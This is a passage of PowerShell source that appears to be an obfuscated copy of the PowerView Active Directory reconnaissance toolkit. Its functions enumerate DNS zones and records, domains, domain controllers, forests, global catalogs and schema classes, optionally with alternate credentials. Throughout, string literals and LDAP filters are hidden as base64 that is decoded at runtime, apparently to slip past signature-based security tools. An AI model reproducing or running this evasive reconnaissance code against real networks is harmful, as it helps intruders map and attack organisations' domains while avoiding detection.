        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENsYXNzPWRuc1pvbmUp")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher1) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = Convert-LDAPProperty -Properties $_.Properties
                $Out | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Wm9uZU5hbWU="))) $Out.name
                $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkROU1pvbmU="))))
                $Out
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
                }
            }
            $DNSSearcher1.dispose()
        }

        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZVByZWZpeA==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049TWljcm9zb2Z0RE5TLERDPURvbWFpbkRuc1pvbmVz")))
        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Out = Convert-LDAPProperty -Properties $_.Properties
                    $Out | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Wm9uZU5hbWU="))) $Out.name
                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkROU1pvbmU="))))
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ETlNab25lXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiB7MH0="))) -f $_)
                    }
                }
            }
            catch {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ETlNab25lXSBFcnJvciBhY2Nlc3NpbmcgJ0NOPU1pY3Jvc29mdEROUyxEQz1Eb21haW5EbnNab25lcw==")))
            }
            $DNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmFtZSxkaXN0aW5ndWlzaGVkbmFtZSxkbnNyZWNvcmQsd2hlbmNyZWF0ZWQsd2hlbmNoYW5nZWQ="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENsYXNzPWRuc05vZGUp")))
            'SearchBasePrefix' = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9ezB9LENOPU1pY3Jvc29mdEROUyxEQz1Eb21haW5EbnNab25lcw=="))) -f $($ZoneName))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $DNSSearcher = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Wm9uZU5hbWU="))) $ZoneName

                    
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord
                    }

                    if ($Record) {
                        $Record.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkROU1JlY29yZA=="))))
                    $Out
                }
                catch {
                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ETlNSZWNvcmRdIEVycm9yOiB7MH0="))) -f $_)
                    $Out
                }
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ETlNSZWNvcmRdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6IHswfQ=="))) -f $_)
                }
            }
            $DNSSearcher.dispose()
        }
    }
}


function Get-Domain {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {

            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LURvbWFpbg==")))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
                $TargetDomain = $Domain
            }
            else {
                
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIEV4dHJhY3RlZCBkb21haW4gJyRUYXJnZXREb21haW4nIGZyb20gLUNyZWRlbnRpYWw=")))
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))), $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIFRoZSBzcGVjaWZpZWQgZG9tYWluICckVGFyZ2V0RG9tYWluJyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3QsIG9yIHRoZSBzcGVjaWZpZWQgY3JlZGVudGlhbHMgYXJlIGludmFsaWQ6IHswfQ=="))) -f $_)
            }
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIFRoZSBzcGVjaWZpZWQgZG9tYWluICckRG9tYWluJyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgb3IgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3QgOiB7MH0="))) -f $_)
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIEVycm9yIHJldHJpZXZpbmcgdGhlIGN1cnJlbnQgZG9tYWluOiB7MH0="))) -f $_)
            }
        }
    }
}


function Get-DomainController {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA==")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }

            
            $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKQ==")))

            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain = Get-Domain @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {

            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Gb3Jlc3RdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LUZvcmVzdA==")))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) {
                $TargetForest = $Forest
            }
            else {
                
                $TargetForest = $Credential.GetNetworkCredential().Domain
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Gb3Jlc3RdIEV4dHJhY3RlZCBkb21haW4gJyRGb3Jlc3QnIGZyb20gLUNyZWRlbnRpYWw=")))
            }

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0"))), $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Gb3Jlc3RdIFRoZSBzcGVjaWZpZWQgZm9yZXN0ICckVGFyZ2V0Rm9yZXN0JyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3QsIG9yIHRoZSBzcGVjaWZpZWQgY3JlZGVudGlhbHMgYXJlIGludmFsaWQ6IHswfQ=="))) -f $_)
                $Null
            }
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0"))), $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Gb3Jlc3RdIFRoZSBzcGVjaWZpZWQgZm9yZXN0ICckRm9yZXN0JyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgb3IgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3Q6IHswfQ=="))) -f $_)
                return $Null
            }
        }
        else {
            
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($ForestObject) {
            
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                $ForestSid = (Get-DomainUser -Identity ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a3JidGd0"))) -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (Get-DomainUser -Identity ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a3JidGd0"))) -Domain $ForestObject.RootDomain.Name).objectsid
            }

            $Parts = $ForestSid -Split ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))
            $ForestSid = $Parts[0..$($Parts.length-2)] -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))
            $ForestObject | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Um9vdERvbWFpblNpZA=="))) $ForestSid
            $ForestObject
        }
    }
}


function Get-ForestDomain {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3NOYW1l")))]) {
                ForEach ($TargetClass in $ClassName) {
                    $ForestObject.Schema.FindClass($TargetClass)
                }
            }
            else {
                $ForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserReferencePropertySet = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $GroupReferencePropertySet = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBFbnVtZXJhdGVkIGZvcmVzdCAnJFRhcmdldEZvcmVzdCcgZm9yIHRhcmdldCBkb21haW4gJyREb21haW4=")))
        }

        $SchemaArguments = @{}
